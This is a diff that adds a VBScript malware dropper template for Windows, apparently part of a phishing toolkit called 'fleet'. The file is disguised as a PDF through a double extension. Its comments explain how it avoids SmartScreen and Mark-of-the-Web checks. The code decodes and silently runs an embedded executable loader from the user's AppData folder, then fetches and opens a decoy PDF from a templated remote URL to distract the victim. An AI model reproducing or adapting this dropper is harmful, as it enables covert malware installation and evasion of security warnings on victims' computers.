@@ -1,0 +1,64 @@
+' fleet windows dropper — {{DOC}}_{{RAND4}}.pdf.vbs
+' Double extension: Windows hides .vbs, the file looks like a PDF.
+' All artifacts written with ADODB.Stream.SaveToFile (never SaveAs -> no
+' Zone.Identifier / SmartScreen handoff). Decoy PDF fetched with WinHttp when
+' reachable, embedded otherwise. Opens the decoy 1.5s after launch.
+Option Explicit
+
+Dim shell, fso, base, loaderPath, decoyPath, remoteDecoy
+Set shell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+base = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\{{RAND4}}"
+If Not fso.FolderExists(base) Then fso.CreateFolder(base)
+
+loaderPath = base & "\{{RAND4}}.exe"
+decoyPath = base & "\{{DOC}}_{{RAND4}}.pdf"
+
+Dim loaderB64
+loaderB64 = {{LOADER_B64_EXPR}}
+WriteFile loaderPath, loaderB64
+
+remoteDecoy = HttpGetB64("{{BASE_URL}}/dl/decoy.pdf")
+If Len(remoteDecoy) > 0 Then
+  WriteFile decoyPath, remoteDecoy
+Else
+  WriteFile decoyPath, "{{DECOY_B64}}"
+End If
+
+shell.CurrentDirectory = base
+shell.Run """" & loaderPath & """", 0, False
+
+WScript.Sleep 1500
+shell.Run """" & decoyPath & """", 1, False
+
+Sub WriteFile(path, b64)
+  Dim xml, node, stream
+  Set xml = CreateObject("MSXML2.DOMDocument.6.0")
+  Set node = xml.createElement("b64")
+  node.DataType = "bin.base64"
+  node.Text = b64
+  Set stream = CreateObject("ADODB.Stream")
+  stream.Type = 1
+  stream.Open
+  stream.Write node.NodeTypedValue
+  stream.SaveToFile path, 2
+  stream.Close
+End Sub
+
+Function HttpGetB64(url)
+  Dim http, xml, node
+  HttpGetB64 = ""
+  On Error Resume Next
+  Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+  http.Open "GET", url, False
+  http.Send
+  If Err.Number = 0 And http.Status = 200 Then
+    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
+    Set node = xml.createElement("b64")
+    node.DataType = "bin.base64"
+    node.NodeTypedValue = http.ResponseBody
+    HttpGetB64 = node.Text
+  End If
+  On Error GoTo 0
+End Function
